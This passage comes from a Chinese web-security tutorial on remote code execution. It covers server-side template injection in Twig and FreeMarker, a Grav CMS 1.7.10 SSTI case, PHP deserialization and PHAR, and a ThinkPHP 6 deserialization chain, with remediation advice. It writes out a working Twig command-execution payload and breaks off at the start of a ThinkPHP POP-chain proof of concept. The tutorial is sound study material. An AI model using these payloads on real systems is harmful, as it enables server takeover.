限制访问权限：确保文件系统中敏感文件和目录的访问权限设置正确，只允许授权用户或者应用程序访问。

使用白名单：使用白名单来限制可以包含的文件或者目录，而不是黑名单。这样可以避免漏洞因为遗漏了某些特定的文件或者目录而被攻击。

禁用动态文件包含：如果可能的话，尽量避免使用动态文件包含功能，例如 PHP 中的 include 或 require。

**3.5 SSTI 导致 RCE**
-------------------

在说 ssti 之前，先说下模板引擎，简单来说就是为了分离用户界面和业务数据的。运行逻辑是先获取用户的输入，经过渲染后呈现到用户面前。而 SSTI 就是服务端模板注入，当用户输入恶意数据后，未经过滤下就可能造成安全危害

而服务器端模板注入（Server-Side Template Injection，SSTI）是一种安全漏洞，允许攻击者通过向服务器端模板引擎提交恶意输入数据来注入并执行不安全的代码。这种攻击的成功依赖于服务器端模板引擎的配置和功能

### **3.5.1 PHP SSTI 注入**

PHP

使用 composer 安装 php 常见的模板 twig

composer require "twig/twig:^3.0"

写一个简单的 demo，并打入 payload，可以发现成功的 RCE

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169276764-c7442aba-d61e-4087-a8df-89645225bdb8.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169276764-c7442aba-d61e-4087-a8df-89645225bdb8.png)

这里贴上 ssti payload 图表，来源于公网

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169276999-169d3fa9-302c-4a45-ae40-a99f3e3b2df4.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169276999-169d3fa9-302c-4a45-ae40-a99f3e3b2df4.png)

### **3.5.2 PHP SSTI 注入案例**

下载地址

[https://getgrav.org/download/core/grav-admin/1.7.10](https://getgrav.org/download/core/grav-admin/1.7.10)

该环境最少需要 php7.3.6 的版本，笔者环境更改为 7.3.9

访问主页进行安装

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169277832-19b87a0b-9395-42f9-84a5-8f502ff82862.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169277832-19b87a0b-9395-42f9-84a5-8f502ff82862.png)

后台页面

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169277869-49b3ad21-e5a9-4db6-a798-743e68b953a4.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169277869-49b3ad21-e5a9-4db6-a798-743e68b953a4.png)

进入到 Pages 模块，随便选一个进入，这里选择 poc

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169278124-2b58da4d-d859-48a0-a9da-02a76e274386.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169278124-2b58da4d-d859-48a0-a9da-02a76e274386.png)

模板这里写 poc

\{\{['whoami']|map('system')|join\}\}

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169278053-5a982a4f-aba4-4974-b51b-270d2fcd12bd.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169278053-5a982a4f-aba4-4974-b51b-270d2fcd12bd.png)

然后点击 expert 模块，添加 twig: true

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169278381-6d6d3333-f367-4390-bacc-4fd9592f3ce0.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169278381-6d6d3333-f367-4390-bacc-4fd9592f3ce0.png)

代码审计

该 RCE 一共两步，第一步先 Save 模板，第二步 preview 进行解析，先来分析第一步，抓包

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169278931-54b9e04b-ca7a-4118-ae9b-a30ba9dfd9ad.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169278931-54b9e04b-ca7a-4118-ae9b-a30ba9dfd9ad.png)

进行 debug，从入口点一步步分析

从 index.php 中进进入 process 函数

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169279225-ebc3781b-1b16-4047-adb5-03a14c24f0cb.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169279225-ebc3781b-1b16-4047-adb5-03a14c24f0cb.png)

然后进入 handle 函数

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169279353-303145f6-018d-48fe-9ade-6303e72c1336.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169279353-303145f6-018d-48fe-9ade-6303e72c1336.png)

在 handle 函数中经过几次判断后，会在 42 行中获取到我们传的 twig 这个模板参数

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169279357-e4b86cf4-0ed1-4375-b454-ffb3fa75a1b2.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169279357-e4b86cf4-0ed1-4375-b454-ffb3fa75a1b2.png)

于是进入其中的 process 并进行 twig 的初始化

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169279392-e3fea776-ccf4-4e92-abd5-fdff064a74e0.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169279392-e3fea776-ccf4-4e92-abd5-fdff064a74e0.png)

经过中间的一些步骤，跳到了 execute 函数

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169280111-38c94583-5e33-4ef2-96ef-d4e5aebc5732.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169280111-38c94583-5e33-4ef2-96ef-d4e5aebc5732.png)

从这里进入 taskSave 函数

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169280210-a40729bd-c399-4500-965e-e4f5690ccc9c.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169280210-a40729bd-c399-4500-965e-e4f5690ccc9c.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169280211-13849a46-dd01-403c-ae58-94f0bc0ac1b8.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169280211-13849a46-dd01-403c-ae58-94f0bc0ac1b8.png)

进入 handleRequest

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169280308-82754dff-8501-48d6-94eb-c44cbacadf69.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169280308-82754dff-8501-48d6-94eb-c44cbacadf69.png)

在 250 行的 parseRequest 解析我们的 request 方法和参数

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169280314-65973bdf-6b5d-4aac-a471-776cfdcbdad9.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169280314-65973bdf-6b5d-4aac-a471-776cfdcbdad9.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169281811-84680e15-de3d-422e-9826-67bd28de952c.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169281811-84680e15-de3d-422e-9826-67bd28de952c.png)

再回到 taskSave 函数中，进入 753 行的 frontmatter 和 757 的 save 函数中

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169282008-a7ede5a0-f182-4d46-b011-5a4301804d1d.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169282008-a7ede5a0-f182-4d46-b011-5a4301804d1d.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169281643-c555e03e-2f87-4278-b1f0-6e22dea9adcb.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169281643-c555e03e-2f87-4278-b1f0-6e22dea9adcb.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169282118-94031056-4860-4229-8bcd-0e30608af9e9.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169282118-94031056-4860-4229-8bcd-0e30608af9e9.png)

在 685 行中跟进 replaceRows 函数

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169282201-fdcb1db6-7d3b-4976-993d-643324148481.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169282201-fdcb1db6-7d3b-4976-993d-643324148481.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169282832-970dac1c-b5db-451f-94ef-d91f095c88ae.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169282832-970dac1c-b5db-451f-94ef-d91f095c88ae.png)

进入 saveRow 函数

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169282947-7d8fee85-7540-4693-b73a-04827e67920b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169282947-7d8fee85-7540-4693-b73a-04827e67920b.png)

在 451 行继续跟进 save 函数

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169283036-0636d079-ccfd-4bb0-a45a-cc44670a3d4b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169283036-0636d079-ccfd-4bb0-a45a-cc44670a3d4b.png)

357 行看到了熟悉的 file_put_contents 函数，写入到 default.md 文件中

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169283025-2f10b10d-3114-4218-ba44-a1ecbb5634fb.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169283025-2f10b10d-3114-4218-ba44-a1ecbb5634fb.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169283124-ce82e947-f411-4d31-b564-73c92ee5add6.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169283124-ce82e947-f411-4d31-b564-73c92ee5add6.png)

然后分析解析流程

点击 preview 进行抓包

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169283778-f7f953c4-f509-48ff-83bd-c319a980a7cb.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169283778-f7f953c4-f509-48ff-83bd-c319a980a7cb.png)

直接进入 execute 函数

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169283943-9980dade-cf85-4826-9066-8d9367aada72.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169283943-9980dade-cf85-4826-9066-8d9367aada72.png)

跟进 taskProcessmarkdown，继续跟进 1866 行的 content

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169283980-33e60b06-0778-424e-843a-c98980b44d78.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169283980-33e60b06-0778-424e-843a-c98980b44d78.png)

在跟进 processTwig

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169284012-1ae8aa19-8d55-4f46-89cf-9a23b71f83fc.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169284012-1ae8aa19-8d55-4f46-89cf-9a23b71f83fc.png)

然后进入 processPage 函数，此时已经获取到了我们模板文件中的数据

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169284127-32420d41-9766-4270-a969-42e6fc6cd2c7.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169284127-32420d41-9766-4270-a969-42e6fc6cd2c7.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169284761-579162fb-79cb-4b6e-95fb-9b91120afb4e.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169284761-579162fb-79cb-4b6e-95fb-9b91120afb4e.png)

此时在 302 行进入 render 开始解析

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169284843-18fcbfea-4600-4de8-b4a0-72c6c0c19d4e.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169284843-18fcbfea-4600-4de8-b4a0-72c6c0c19d4e.png)

后面就是正常跟进，这里不做解释

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169284936-480e3c30-63aa-4130-bd52-bd5db1137ab9.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169284936-480e3c30-63aa-4130-bd52-bd5db1137ab9.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169284990-a3cd2a04-0c8b-4a0e-84f9-73a8d6265750.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169284990-a3cd2a04-0c8b-4a0e-84f9-73a8d6265750.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169285048-b169968b-57c6-4be8-89b3-3dbffedb4a2d.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169285048-b169968b-57c6-4be8-89b3-3dbffedb4a2d.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169285739-fa965719-62f5-4b45-8ee1-63271ee329ee.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169285739-fa965719-62f5-4b45-8ee1-63271ee329ee.png)

此时进入到 doDisplay 函数中，并调用 twig_array_map

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169285821-f3a5cffa-9ef9-416d-9903-9d8a5079fee6.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169285821-f3a5cffa-9ef9-416d-9903-9d8a5079fee6.png)

最后进入 twig_array_map 函数中，成功 RCE

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169285963-832aa35d-e3b7-475b-9f0e-0a386b97c3e3.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169285963-832aa35d-e3b7-475b-9f0e-0a386b97c3e3.png)

### **3.5.3 JAVA SSTI 注入**

JAVA

Java 有几个常用的模板，例如 FreeMarker，Thymleaf, velocity，本篇文章使用 freeMarker 作为案例

安装完后简单复现一下，可以发现成功 RCE

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169286025-5df13cf8-6203-4580-bca2-b61f927ac93c.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169286025-5df13cf8-6203-4580-bca2-b61f927ac93c.png)

### **3.5.4 JAVA SSTI 注入案例**

这里直接用上面的 freeMarker 的例子，在 FreemArkerServelet 14 行下断点然后在 Execute.class 也下个断点，开始进行 debug

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169286053-85eabee8-48ba-4536-bbb3-d9ad47fd2997.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169286053-85eabee8-48ba-4536-bbb3-d9ad47fd2997.png)

从 doGet 中，先跟进 process

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169287505-bcf7e557-fbd8-4861-88cb-55d4850c3496.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169287505-bcf7e557-fbd8-4861-88cb-55d4850c3496.png)

然后进入 Environment 类中的 process

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169287382-91ae895e-45a5-4a98-9485-ca6c9622b6e9.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169287382-91ae895e-45a5-4a98-9485-ca6c9622b6e9.png)

getRootTreeNode 中获取了我们的 poc 参数

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169287594-bc2cadba-8440-4d00-a8d3-f4c3ac5d395a.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169287594-bc2cadba-8440-4d00-a8d3-f4c3ac5d395a.png)

进入 visit，通过递归循环遍历每个元素

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169287579-eb18d508-5594-44be-bb7b-40d860f870b8.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169287579-eb18d508-5594-44be-bb7b-40d860f870b8.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169287700-09a429de-ffd3-4dec-b162-afef7f779141.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169287700-09a429de-ffd3-4dec-b162-afef7f779141.png)

获取之后到最后一个参数 ex(“whoami”) 后，进入 element.accept

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169288235-2d7689f5-ff78-44f6-8311-ba5b89fab249.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169288235-2d7689f5-ff78-44f6-8311-ba5b89fab249.png)

跟进 calculateInterpolatedStringOrMarkup

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169288314-5c742728-973f-4731-b4e5-e69b74bf2a57.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169288314-5c742728-973f-4731-b4e5-e69b74bf2a57.png)

进入 eval

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169288210-e404c5f4-38d9-4443-bed5-feb075d79520.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169288210-e404c5f4-38d9-4443-bed5-feb075d79520.png)

跟进_eval，此时通过前面的解析，这时的 argumentStrings 已经是我们的命令 whoami 了

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169288382-401f3b4c-591e-4bbf-b630-d08727eade82.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169288382-401f3b4c-591e-4bbf-b630-d08727eade82.png)

然后传进 exec，使用 runtime 类执行，至此流程结束

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169288527-080f3cfc-48f7-45a8-a3da-e7a8269a8033.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169288527-080f3cfc-48f7-45a8-a3da-e7a8269a8033.png)

### **3.5.6 修复 / 预防方案**

验证和清理输入：对所有用户输入进行严格验证和清理，确保输入内容不包含可能会被模板引擎错误解释执行的代码或标记。

使用安全的模板引擎配置：许多模板引擎提供了防止 SSTI 的安全配置选项。确保模板引擎以最安全的方式配置，并禁用不必要的功能。

限制模板引擎功能：限制模板引擎可以访问的功能和 API，尽量减少攻击者可利用的攻击面。例如，禁止模板直接访问文件系统或执行系统命令。

使用沙箱环境：在可能的情况下，将模板引擎运行在沙箱环境中，以限制模板代码的执行权限，防止恶意代码访问或修改敏感资源。

内容安全策略（CSP）：实施内容安全策略，限制可以执行的脚本类型和来源，降低潜在的攻击影响。

更新和打补丁：定期更新和给模板引擎及其依赖库打补丁，以修复已知的安全漏洞。

**3.6 反序列化导致 RCE**
------------------

反序列化漏洞发生在当不安全地处理从不可信源接收的序列化数据时。序列化是将对象状态或数据结构转换为可以存储或传输的格式（如 XML、JSON、二进制格式）的过程，而反序列化是将这种格式恢复为原始的对象状态或数据结构的过程。如果应用程序不安全地反序列化用户提供的数据，攻击者可能能够执行恶意代码或操作应用程序行为，导致数据泄露、服务拒绝、甚至完全控制受影响的服务器。

### **3.6.1 PHP 反序列化**

PHP

比如下面代码就是一个简单的序列化和反序列化的过程

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169289212-60e66bae-d230-4681-ae2d-87c05768a500.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169289212-60e66bae-d230-4681-ae2d-87c05768a500.png)

而当反序列化的目标类中存在敏感函数时，就很可能被利用，比如 1.php 是目标代码，2.php 是本地代码进行利用

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169289271-4e168894-ceea-4d09-9219-60f0e4245932.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169289271-4e168894-ceea-4d09-9219-60f0e4245932.png)

序列化字符串的组成：

O:7:"example": 这部分指明了被序列化的是一个对象 (O)。7 表示类名的字符数，"example" 是类名。

1: 表明对象有一个属性。这是属性计数，用来指明接下来会有多少个属性 - 值对。

s:4:"test";: 这是属性名。s 表示字符串，4 是属性名 "test" 的长度。

s:10:"phpinfo();";: 这是属性的值。s 同样表示字符串，10 是值 "phpinfo();" 的长度。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169289492-d67d2f10-f724-4265-bbc9-4e6ce79e2aa6.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169289492-d67d2f10-f724-4265-bbc9-4e6ce79e2aa6.png)

而在 php 当中，关于序列化和反序列化的魔法函数有很多，魔术方法是一种特殊的方法，当对 对象执行某些操作时会覆盖 PHP 的默认操作。而 PHP 中最为常见也是最为基础的就是 **construct 和** destruct，其他魔术方法可自行搜索查询

__construct 构造函数，具有构造函数的类会在每次创建新对象时先调用此方法

__destruct 析构函数，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169289433-84f8f246-6413-4616-9976-28f505574644.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169289433-84f8f246-6413-4616-9976-28f505574644.png)

### **3.6.2 PHP 反序列化进阶（PHAR）**

phar 文件是 PHP 中的一种特殊文件格式，全称为 PHP Archive，用于将多个 PHP 文件或其他类型的文件打包成一个单一的归档文件。

Phar 文件由以下四个结构组成

1 a Stub

这是 Phar 文件的启动器部分，是可执行的 PHP 代码，格式为 xxx<?php xxx;**HALT_COMPILER();?> （必须有** HALT_COMPILER() 否则是无法识别的）

2 a manifest describing the contents

文件的属性都在这里。此处是主要攻击点，因为 meta-data 的一些信息是以序列化的方式储存的。

3 the file contents

被压缩文件的内容，文件内容按照 Manifest 中列出的顺序存储。

4 signature

Phar 文件的最后部分是可选的签名，用于验证归档的完整性和真实性。签名可以是 SHA1 或 SHA256 等算法生成的，确保 Phar 文件在分发过程中没有被篡改。

生成 phar 文件需要将 php.ini 中的 phar.readonly 设置为 Off

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169289513-098aaca4-e5ab-419b-8c06-2f2f0dff7861.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169289513-098aaca4-e5ab-419b-8c06-2f2f0dff7861.png)

以下是一个简单的案例

使用这段代码创建一个 test.phar 文件

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169290130-4e5346e5-1573-43fe-9f8c-ded42a560e50.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169290130-4e5346e5-1573-43fe-9f8c-ded42a560e50.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169290183-47ad03b8-2310-4cbb-a2bc-420410d41ad8.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169290183-47ad03b8-2310-4cbb-a2bc-420410d41ad8.png)

使用 is_file，可以看到成功的执行了 phpinfo();

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169290311-0d584a83-3887-40fd-9e1b-36b95db14813.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169290311-0d584a83-3887-40fd-9e1b-36b95db14813.png)

根据公网资料显示，除以下所有文件函数外，只要调用了 php_stream_open_wrapper 的函数都可触发

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169290340-df1e63a6-1e04-4621-bfea-9c7280588f52.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169290340-df1e63a6-1e04-4621-bfea-9c7280588f52.png)

### **3.6.3PHP 反序列化案例**

PHP 有很多开发框架例如 ThinkPHP，Laravel 等，这里选择 thinkphp 来做为案例

ThinkPHP 是一个免费开源的，快速、简单的面向对象的轻量级 PHP 开发框架，是为了敏捷 WEB 应用开发和简化企业应用开发而诞生的。ThinkPHP 从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简代码的同时，更注重易用性。遵循 Apache2 开源许可协议发布，意味着你可以免费使用 ThinkPHP，甚至允许把你基于 ThinkPHP 开发的应用开源或商业产品发布 / 销售。

ThinkPHP6.0 基于精简核心和统一用法两大原则在 5.1 的基础上对底层架构做了进一步的优化改进，并更加规范化。由于引入了一些新特性，ThinkPHP6.0 运行环境要求 PHP7.2+，不支持 5.1 的无缝升级（官方给出了升级指导用于项目的升级参考）。

首先安装 thinkphp6，注意 tp6 之后只能使用 composer 安装

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169290404-35702dd8-ef6d-4718-bc19-c5bb30542aaa.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169290404-35702dd8-ef6d-4718-bc19-c5bb30542aaa.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169291125-29d5edf5-7d26-43bc-856c-f016a6ae08b6.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169291125-29d5edf5-7d26-43bc-856c-f016a6ae08b6.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169291072-f6b3078f-a8de-4cce-afdd-b55a97f7cb03.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169291072-f6b3078f-a8de-4cce-afdd-b55a97f7cb03.png)

我们在 poc 当中可以看到漏洞最终调用点

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169291308-f6f00f18-0b05-41b7-b1a7-fcba4a3fc31d.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169291308-f6f00f18-0b05-41b7-b1a7-fcba4a3fc31d.png)

找到该处，可以看到最后是在 103 行使用 eval 执行的

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169291372-8612fdfd-6455-4c41-b9e0-7ffab4d8ccb2.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169291372-8612fdfd-6455-4c41-b9e0-7ffab4d8ccb2.png)

漏洞复现：

新建一个 vul 方法

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169291449-a3ecd71e-fe94-44f4-a8ff-43d07b3c04b6.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169291449-a3ecd71e-fe94-44f4-a8ff-43d07b3c04b6.png)

然后直接打入 payload

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169291971-e52ae1bc-18fe-45a5-b817-b979716b8a1a.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169291971-e52ae1bc-18fe-45a5-b817-b979716b8a1a.png)

反序列化起始点，destruct 函数，

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169292023-9c4276f9-dbcb-4c53-a523-be4500c4120b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169292023-9c4276f9-dbcb-4c53-a523-be4500c4120b.png)

然后可以看到跟进了 save 函数

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169292087-d26a2e21-1ef3-4a1f-bfab-320bf35dbca4.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169292087-d26a2e21-1ef3-4a1f-bfab-320bf35dbca4.png)

其中在初始化的过程中传入了 pool 参数，

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169292139-eb691451-1fee-454f-ab45-bf937ff6d399.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169292139-eb691451-1fee-454f-ab45-bf937ff6d399.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169292190-c9772de9-55fa-4bc5-9ee3-d901b01844b8.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169292190-c9772de9-55fa-4bc5-9ee3-d901b01844b8.png)

$this->pool->getItem 调用时，触发了魔术方法_call，因为 Channel 对象中没有 getItem 方法。此时也会执行构造方法

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169292823-94fd9256-d658-4819-8dd7-e141a26924da.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169292823-94fd9256-d658-4819-8dd7-e141a26924da.png)

其中 call 函数调用了 log 函数，然后又调用了 record，f7 跟进去看看执行了什么

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169292937-27834909-d7bc-4184-9ee8-e93ee6ea7caa.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169292937-27834909-d7bc-4184-9ee8-e93ee6ea7caa.png)

我们可以看到在 104 行调用了 save，继续跟进来

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169293185-a95c8718-62c2-455b-997f-bb4f4a8da859.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169293185-a95c8718-62c2-455b-997f-bb4f4a8da859.png)

我们可以看到 145 中还调用了 save 函数，因为此时初始化的变量 logger 为 think\log\driver\Socket，所以此时的 save 函数是去往 Socket 的类

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169293058-17e79068-310d-4249-8b4d-611f65028034.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169293058-17e79068-310d-4249-8b4d-611f65028034.png)

跟进来

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169293711-2210be76-0005-43dc-83de-a33e59f2f098.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169293711-2210be76-0005-43dc-83de-a33e59f2f098.png)

经过 request 类中的 url 函数解析后可以看到解析出来了我们的 phpinfo

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169294002-28830716-7da4-4b93-920a-6516058784aa.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169294002-28830716-7da4-4b93-920a-6516058784aa.png)

其中前面加的 http 是在 domain 函数和 scheme 函数中获取的

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169294123-58c0978a-04fe-42ee-9975-24a087074863.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169294123-58c0978a-04fe-42ee-9975-24a087074863.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169294181-c9f6a014-87d5-4b68-9b30-f354b31a2ed2.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169294181-c9f6a014-87d5-4b68-9b30-f354b31a2ed2.png)

再跟进去 invoke 函数，可以看到传入了 display

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169294211-f0e2b578-139b-4367-bd94-17ca273ceae0.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169294211-f0e2b578-139b-4367-bd94-17ca273ceae0.png)

然后跟进 invokeMethod 函数

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169294943-4f6a0f24-c2b7-48e6-8a23-d165c249aeee.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169294943-4f6a0f24-c2b7-48e6-8a23-d165c249aeee.png)

最后代入函数 eval 中解析 php 代码

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169294770-6063079e-a308-4949-9b8a-5fc17b88a4e4.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169294770-6063079e-a308-4949-9b8a-5fc17b88a4e4.png)

成功 RCE

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169294802-a99f6deb-a58d-4831-ab70-f431e81c3fe2.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169294802-a99f6deb-a58d-4831-ab70-f431e81c3fe2.png)

最后的反序列化 poc 为

<?php

namespace League\Flysystem\Cached\Storage{

class Psr6Cache{

private $pool;

protected $autosave = false;

